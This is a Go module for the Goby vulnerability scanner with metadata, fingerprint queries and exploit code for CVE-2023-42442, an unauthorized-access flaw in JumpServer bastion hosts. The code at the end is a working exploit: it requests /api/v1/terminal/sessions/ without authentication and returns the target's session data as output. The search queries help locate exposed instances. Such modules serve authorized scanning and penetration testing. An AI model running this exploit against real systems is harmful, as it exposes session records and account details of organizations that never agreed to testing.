package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JumpServer /terminal/sessions api Unauthorized Access Vulnerability（CVE-2023-42442）",
    "Description": "<p>JumpServer is an open source bastion machine that complies with 4A specifications, helping enterprises to control and log in various types of assets in a more secure manner, achieving pre-authorization, in-process supervision, and post-event auditing, and meeting the requirements for compliance with other standards.</p><p>JumpServer has an unauthorized access vulnerability in versions 3.0.0-3.6.3. Due to unreasonable system permission configuration, unauthorized attackers can directly access /api/v1/terminal/sessions/ related routes.</p>",
    "Product": "JumpServer",
    "Homepage": "https://github.com/jumpserver/jumpserver",
    "DisclosureDate": "2023-09-19",
    "Author": "marsjob@163.com",
    "FofaQuery": "title=\"Jumpserver\" || body=\"static/js/jumpserver.js\" || body=\"static/css/jumpserver.css\" || body=\"/handle/captcha/refresh/captcha.php\" || body=\"欢迎使用JumpServer开源堡垒机\" || (body=\"users/password/forgot/\" && body=\"csrfmiddlewaretoken\") || body=\"ui/theme/element-ui.css\"",
    "GobyQuery": "title=\"Jumpserver\" || body=\"static/js/jumpserver.js\" || body=\"static/css/jumpserver.css\" || body=\"/handle/captcha/refresh/captcha.php\" || body=\"欢迎使用JumpServer开源堡垒机\" || (body=\"users/password/forgot/\" && body=\"csrfmiddlewaretoken\") || body=\"ui/theme/element-ui.css\"",
    "Level": "2",
    "Impact": "<p>JumpServer has an unauthorized access vulnerability in versions 3.0.0-3.6.3. Due to unreasonable system permission configuration, unauthorized attackers can directly access /api/v1/terminal/sessions/ related routes.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw\">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "2H1W"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2023-42442"
    ],
    "CNNVD": [
        "CNNVD-202309-1115"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "JumpServer /terminal/sessions 接口未授权访问漏洞（CVE-2023-42442）",
            "Product": "JumpServer",
            "Description": "<p>JumpServer 是一款符合4A规范的开源堡垒机，帮助企业以更安全的方式管控和登录各种类型的资产，实现事前授权、事中监察、事后审计，满足等保合规要求。</p><p>JumpServer 在 3.0.0-3.6.3 版本存在未授权访问漏洞。由于系统权限配置存在不合理，导致未授权攻击者可以直接访问 /api/v1/terminal/sessions/ 相关路由。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw\" target=\"_blank\">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw</a><br></p>",
            "Impact": "<p>JumpServer 在 3.0.0-3.6.3 版本存在未授权访问漏洞。由于系统权限配置存在不合理，导致未授权攻击者可以直接访问 /api/v1/terminal/sessions/ 相关路由。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "JumpServer /terminal/sessions api Unauthorized Access Vulnerability（CVE-2023-42442）",
            "Product": "JumpServer",
            "Description": "<p>JumpServer is an open source bastion machine that complies with 4A specifications, helping enterprises to control and log in various types of assets in a more secure manner, achieving pre-authorization, in-process supervision, and post-event auditing, and meeting the requirements for compliance with other standards.</p><p>JumpServer has an unauthorized access vulnerability in versions 3.0.0-3.6.3. Due to unreasonable system permission configuration, unauthorized attackers can directly access /api/v1/terminal/sessions/ related routes.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw\" target=\"_blank\">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw</a><br></p>",
            "Impact": "<p>JumpServer has an unauthorized access vulnerability in versions 3.0.0-3.6.3. Due to unreasonable system permission configuration, unauthorized attackers can directly access /api/v1/terminal/sessions/ related routes.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-20",
    "PocId": "9960"
}`
	sendPayloadYFDKWQPOUEGR := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig("/api/v1/terminal/sessions/")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadYFDKWQPOUEGR(hostInfo)
			return err == nil && resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "account_id")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := sendPayloadYFDKWQPOUEGR(expResult.HostInfo)
			if err == nil && resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "account_id") {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
